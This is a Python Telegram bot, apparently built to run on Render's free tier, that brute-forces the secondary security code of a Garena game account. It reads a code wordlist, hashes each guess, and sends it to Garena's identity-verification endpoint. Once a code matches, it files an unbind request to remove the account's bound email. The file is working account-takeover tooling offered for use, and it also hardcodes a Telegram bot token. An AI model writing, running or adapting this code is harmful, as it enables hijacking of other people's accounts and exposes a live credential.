import os
import sys
import json
import time
import math
import random
import socket
import hashlib
import threading
import urllib3
import requests
from datetime import datetime, timedelta
from telebot import TeleBot, types
from flask import Flask  # Render-এর ফ্রি সার্ভার সচল রাখার জন্য

# গ্যারেনা এপিআই SSL সতর্কবার্তা বন্ধ রাখা
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---- CONFIGURATION ----
BOT_TOKEN = "8732802442:AAGx6Xq03Sgll4uKPSS9xYSBz_5Qx4nE23s"
bot = TeleBot(BOT_TOKEN)

# Render ফ্রি সার্ভার ট্রিকস (Flask App Engine)
app = Flask(__name__)

@app.route('/')
def home():
    return "Spidey Auto-Bind Engine is Live 24/7!"

def run_flask():
    # Render ফ্রি সার্ভারে পোর্ট ও হোস্ট বাইন্ডিং মেকানিজম
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ৩ দিন একটানা ট্র্যাকিং করার গ্লোবাল মেমোরি কোর
attack_running = False
current_testing_code = "None"
processed_count = 0
total_codes_count = 0
active_chat_id = None
global_error_log = []
attack_start_time = None
target_email = "Not Fetched Yet"

def format_time_delta(seconds):
    if seconds is None: return "00d 00h 00m 00s"
    td = timedelta(seconds=int(seconds))
    return f"{td.days}d {td.seconds // 3600}h {(td.seconds // 60) % 60}m {td.seconds % 60}s"

# ---- CORE BRUTEFORCE LOGIC ENGINE ----
def run_bruteforce_logic(access_token, chat_id):
    global attack_running, current_testing_code, processed_count, total_codes_count
    global attack_start_time, target_email
    
    attack_start_time = time.time()
    
    if not os.path.exists("HLO.txt"):
        bot.send_message(chat_id, "❌ Error: 'HLO.txt' file nahi mili! Server par banao.")
        attack_running = False
        return

    bot.send_message(chat_id, "🔍 <b>[1/3] Fetching Bound Email automatically...</b>", parse_mode="HTML")
    
    try:
        url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        info_payload = {'app_id': "100067", 'access_token': access_token}
        info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
        
        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=12)
        email = r_info.json().get("email", "")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Gateway Error: {str(e)}")
        attack_running = False
        return
        
    if not email:
        bot.send_message(chat_id, "❌ Account par koi bound email nahi mila!")
        attack_running = False
        return
        
    target_email = email
    bot.send_message(chat_id, f"✅ Bound Email Found: <code>{email}</code>\n\n🚀 Starting Core Bruteforce Attack...", parse_mode="HTML")

    with open("HLO.txt", "r") as f:
        codes = [line.strip() for line in f if line.strip()]
        
    total_codes_count = len(codes)
    processed_count = 0
    headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"}
    identity_token, matched_code = None, None

    for code in codes:
        if not attack_running:
            bot.send_message(chat_id, f"🛑 Attack Stopped. Index: {processed_count}")
            return

        current_testing_code = code
        processed_count += 1
        hashed_sec_code = hashlib.sha256(code.encode('utf-8')).hexdigest()
        
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {"email": email, "app_id": "100067", "access_token": access_token, "secondary_password": hashed_sec_code}
        
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=10)
            res_json = resp.json()
            if "identity_token" in res_json and res_json.get("identity_token"):
                identity_token = res_json.get("identity_token")
                matched_code = code
                break
        except Exception as req_err:
            global_error_log.append(f"{code}: {str(req_err)}")
            time.sleep(3.0)
            pass
            
        time.sleep(0.2)

    if identity_token and matched_code:
        bot.send_message(chat_id, f"🎉 <b>CRACKED SECURITY CODE:</b> <code>{matched_code}</code>", parse_mode="HTML")
        
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        unbind_data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
        
        try:
            final_resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=12)
            bot.send_message(chat_id, f"📥 Garena Response:\n<code>{final_resp.text}</code>", parse_mode="HTML")
        except Exception as final_unbind_err:
            bot.send_message(chat_id, f"❌ Unbind Request failed: {str(final_unbind_err)}")
    else:
        bot.send_message(chat_id, "❌ Verification FAILED! No code matched.")
    attack_running = False

# ---- TELEGRAM BOT COMMANDS & INTERFACE ----
def get_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(types.KeyboardButton("🚀 Launch Attack Control"), types.KeyboardButton("📊 Live System Status"), types.KeyboardButton("🛑 Terminate Attack Instance"))
    return markup

@bot.message_handler(commands=['start'])
def welcome_message(message):
    global active_chat_id
    active_chat_id = message.chat.id
    bot.send_message(active_chat_id, "🤖 <b>Spidey Engine Active on Free Render Cloud!</b>", parse_mode="HTML", reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda msg: True)
def handle_buttons(message):
    global attack_running, current_testing_code, processed_count, total_codes_count, attack_start_time, target_email
    chat_id = message.chat.id

    if message.text == "🚀 Launch Attack Control":
        if attack_running: bot.send_message(chat_id, "⚠️ Already running!")
        else:
            sent_msg = bot.send_message(chat_id, "🔑 Enter Garena <b>Access Token</b>:", parse_mode="HTML")
            bot.register_next_step_handler(sent_msg, process_token_input)
    elif message.text == "📊 Live System Status":
        if not attack_running: bot.send_message(chat_id, "💤 System is IDLE.")
        else:
            elapsed = time.time() - attack_start_time
            status_text = f"📈 <b>Live Diagnostics</b>\n🟢 State: RUNNING\n🎯 Email: <code>{target_email}</code>\n🔄 Progress: <code>{processed_count}/{total_codes_count}</code>\n⚡ Testing: <code>{current_testing_code}</code>\n⏱️ Elapsed: <code>{format_time_delta(elapsed)}</code>"
            bot.send_message(chat_id, status_text, parse_mode="HTML")
    elif message.text == "🛑 Terminate Attack Instance":
        if attack_running:
            attack_running = False
            bot.send_message(chat_id, "⏳ Stopping...")
        else: bot.send_message(chat_id, "❌ No active attack.")

def process_token_input(message):
    global attack_running
    chat_id = message.chat.id
    token = message.text.strip()
    if not token or token in ["🚀 Launch Attack Control", "📊 Live System Status", "🛑 Terminate Attack Instance"]: return
    bot.send_message(chat_id, "⏱️ Injecting payload thread...")
    attack_running = True
    threading.Thread(target=run_bruteforce_logic, args=(token, chat_id), daemon=True).start()

# Render ফ্রি প্ল্যানকে ৩ দিন জাগিয়ে রাখার কোর সেলফ-পিং ইঞ্জিন
def self_ping_loop():
    while True:
        try:
            # ১০ মিনিট পর পর রেন্ডার সার্ভার নিজেকে নিজে রিকোয়েস্ট পাঠাবে ঘুমানো আটকাতে
            requests.get("http://127.0.0", timeout=5)
        except Exception:
            pass
        time.sleep(600)

if __name__ == "__main__":
    # Flask ওয়েব সার্ভার আলাদা থ্রেডে চালু করা
    threading.Thread(target=run_flask, daemon=True).start()
    # সেলফ পিং ইঞ্জিন চালু করা
    threading.Thread(target=self_ping_loop, daemon=True).start()
    # মেইন টেলিগ্রাম বট পোলিং স্টার্ট
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
